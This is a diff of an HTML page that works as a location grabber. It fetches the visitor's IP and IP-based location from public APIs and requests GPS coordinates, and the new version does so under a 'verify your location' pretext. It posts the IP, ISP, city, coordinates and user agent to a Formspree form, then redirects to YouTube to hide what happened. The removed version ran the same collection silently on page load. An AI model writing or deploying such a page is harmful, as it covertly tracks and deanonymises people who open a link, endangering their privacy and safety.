@@ -1,100 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Redirecting...</title>
+  <meta charset="UTF-8">
+  <title>Allow Location</title>
   <style>
-    body {
-      font-family: Arial;
-      text-align: center;
-      padding: 50px;
-      background-color: #f4f4f4;
-    }
-    .box {
-      display: inline-block;
-      padding: 20px;
-      background: white;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #ccc;
-    }
+    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+    button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Please wait...</h2>
-    <p>Tracking and redirecting...</p>
-  </div>
+  <h2>📍 Please allow location access</h2>
+  <p>This helps us verify your location.</p>
+  <button onclick="startTracking()">Allow & Continue</button>
 
-
-<script>
-async function getGeoCoords() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve({ latitude: "Not supported", longitude: "Not supported" });
-    } else {
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          resolve({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          });
-        },
-        error => {
-          resolve({ latitude: "Permission denied", longitude: "Permission denied" });
-        },
-        { timeout: 10000 }
-      );
+  <script>
+    async function getGeoCoords() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ latitude: "Not supported", longitude: "Not supported" });
+        } else {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              resolve({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+              });
+            },
+            error => {
+              resolve({ latitude: "Permission denied", longitude: "Permission denied" });
+            },
+            { timeout: 10000 }
+          );
+        }
+      });
     }
-  });
-}
 
-async function getVisitorData() {
-  try {
-    // Step 1: Get IP
-    const ipRes = await fetch('https://api64.ipify.org?format=json');
-    const ipJson = await ipRes.json();
-    const ip = ipJson.ip;
+    async function startTracking() {
+      try {
+        // IP
+        const ipRes = await fetch('https://api64.ipify.org?format=json');
+        const ipJson = await ipRes.json();
+        const ip = ipJson.ip;
 
-    // Step 2: Get IP-based location
-    const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
-    const locData = await locRes.json();
+        // Location via IP
+        const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
+        const locData = await locRes.json();
 
-    // Step 3: Ask browser GPS permission
-    const gps = await getGeoCoords();
+        // GPS
+        const gps = await getGeoCoords();
 
-    // Step 4: Send to Formspree
-    const data = {
-      ip: ip,
-      country: locData.country || 'N/A',
-      city: locData.city || 'N/A',
-      region: locData.region || 'N/A',
-      isp: locData.org || 'N/A',
-      timezone: locData.timezone || 'N/A',
-      latitude: gps.latitude,
-      longitude: gps.longitude,
-      user_agent: navigator.userAgent
-    };
+        // Final data
+        const data = {
+          ip: ip,
+          isp: locData.org || 'N/A',
+          country: locData.country || 'N/A',
+          city: locData.city || 'N/A',
+          region: locData.region || 'N/A',
+          timezone: locData.timezone || 'N/A',
+          latitude: gps.latitude,
+          longitude: gps.longitude,
+          user_agent: navigator.userAgent
+        };
 
-    await fetch("https://formspree.io/f/mldnbqvo", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
+        // Send to Formspree
+        await fetch("https://formspree.io/f/mldnbqvo", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
 
-  } catch (e) {
-    console.error("Error:", e);
-  } finally {
-    window.location.href = "https://youtube.com";
-  }
-}
-
-window.onload = () => {
-  getVisitorData();
-};
-</script>
-
-
-
-  
-  
+      } catch (err) {
+        console.error("Tracking error:", err);
+      } finally {
+        window.location.href = "https://youtube.com"; // ✅ redirect works
+      }
+    }
+  </script>
+</body>
+</html>
